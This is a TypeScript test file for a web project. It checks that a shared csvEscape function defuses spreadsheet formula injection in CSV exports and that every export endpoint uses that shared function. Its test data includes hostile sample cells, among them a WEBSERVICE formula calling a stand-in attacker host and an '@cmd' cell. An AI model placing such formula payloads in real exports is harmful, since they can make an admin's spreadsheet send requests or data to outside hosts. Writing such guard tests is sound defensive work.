// CSV formula-injection guard: behaviour tests plus a wiring tripwire.
//
// Part 1 checks the shared csvEscape in lib/csv.ts actually neutralises
// spreadsheet formulas (=, +, -, @, tab, CR) so an admin opening an export
// in Excel can never execute a payload typed into a public form field.
//
// Part 2 is the tripwire that stops security drift: every endpoint that
// builds a CSV export MUST import csvEscape from lib/csv and MUST NOT define
// its own copy. This is the exact mistake that shipped in August 2026 — the
// laughter-yoga handler had a private, un-guarded csvEscape while the other
// forms used the shared one. When you add a new form or export, add its
// source to EXPORTERS below so the suite watches it too.
//
// Background: docs/ARCHITECTURE-ANALYSIS-2026-08-22.md Flaw 1, and
// docs/plans/security-remediation-plan.md Phase 4c.

import { describe, it, expect } from 'vitest';
import { csvEscape } from '../csv';
import volunteerRegSrc from '../../api/volunteer-reg?raw';
import membershipRegSrc from '../../api/membership-reg?raw';
import laughterYogaRegSrc from '../../api/laughter-yoga-reg?raw';
import regAdminExportSrc from '../../api/reg/admin-export?raw';
import approvalsSrc from '../../api/approvals?raw';

// Vite's import.meta.glob is not in @cloudflare/workers-types; declare the
// narrow shape this file uses so tsc passes.
declare global {
  interface ImportMeta {
    glob(
      pattern: string,
      options: { query?: string; import?: string; eager?: boolean },
    ): Record<string, unknown>;
  }
}

// Every file that builds a CSV export for users. Add new exporters here.
const EXPORTERS: Array<[name: string, source: string]> = [
  ['volunteer-reg.ts', volunteerRegSrc],
  ['membership-reg.ts', membershipRegSrc],
  ['laughter-yoga-reg.ts', laughterYogaRegSrc],
  ['reg/admin-export.ts', regAdminExportSrc],
  ['approvals.ts', approvalsSrc],
];

describe('csvEscape — formula-injection guard', () => {
  it('prefixes cells that start with formula trigger characters', () => {
    // Contains double quotes, so it gets the ' prefix AND RFC-4180 quoting.
    expect(csvEscape('=WEBSERVICE("http://evil.example")')).toBe(
      "\"'=WEBSERVICE(\"\"http://evil.example\"\")\"",
    );
    expect(csvEscape('=SUM(A1:A2)')).toBe("'=SUM(A1:A2)");
    expect(csvEscape('+SUM(1,1)')).toBe("\"'+SUM(1,1)\"");
    expect(csvEscape('-1+1')).toBe("'-1+1");
    expect(csvEscape('@cmd')).toBe("'@cmd");
    expect(csvEscape('\ttab-led')).toBe("'\ttab-led");
    // CR also triggers RFC quoting on top of the prefix.
    expect(csvEscape('\rCR-led')).toBe("\"'\rCR-led\"");
  });

  it('leaves ordinary values untouched', () => {
    expect(csvEscape('Angela Wong')).toBe('Angela Wong');
    expect(csvEscape('42')).toBe('42');
    expect(csvEscape('')).toBe('');
    expect(csvEscape(null)).toBe('');
    expect(csvEscape(undefined)).toBe('');
  });

  it('still applies RFC-4180 quoting for commas, quotes and newlines', () => {
    expect(csvEscape('Wong, Angela')).toBe('"Wong, Angela"');
    expect(csvEscape('He said "hi"')).toBe('"He said ""hi"""');
    expect(csvEscape('line1\nline2')).toBe('"line1\nline2"');
    expect(csvEscape('=cmd,with,commas')).toBe('"\'=cmd,with,commas"');
  });
});

describe('CSV export wiring — no private copies of csvEscape', () => {
  it.each(EXPORTERS)('%s imports csvEscape from lib/csv', (_name, source) => {
    expect(source).toMatch(/import\s*\{[^}]*csvEscape[^}]*\}\s*from\s*['"][^'"]*lib\/csv['"]/);
  });

  it.each(EXPORTERS)('%s does not define its own csvEscape', (_name, source) => {
    expect(source).not.toContain('function csvEscape(');
  });

  it('covers every endpoint that calls csvEscape', async () => {
    // If someone adds csvEscape usage to a NEW file but forgets to list it in
    // EXPORTERS above, this test fails. It lists all src/worker files whose
    // source mentions csvEscape and requires each to be in EXPORTERS.
    const sources = import.meta.glob('../../api/**/*.ts', {
      query: '?raw',
      import: 'default',
      eager: true,
    }) as Record<string, string>;
    const mentioned = Object.entries(sources)
      .filter(([path, src]) => src.includes('csvEscape'))
      .map(([path]) => path.replace('../../api/', ''));
    // If glob ever breaks or matches nothing, fail loudly instead of passing
    // with an empty list.
    expect(mentioned.length).toBeGreaterThan(0);
    const listed = EXPORTERS.map(([name]) => name);
    for (const file of mentioned) {
      expect(listed, `exporter ${file} uses csvEscape but is missing from EXPORTERS in csv-guard.test.ts — add it`).toContain(file);
    }
  });
});
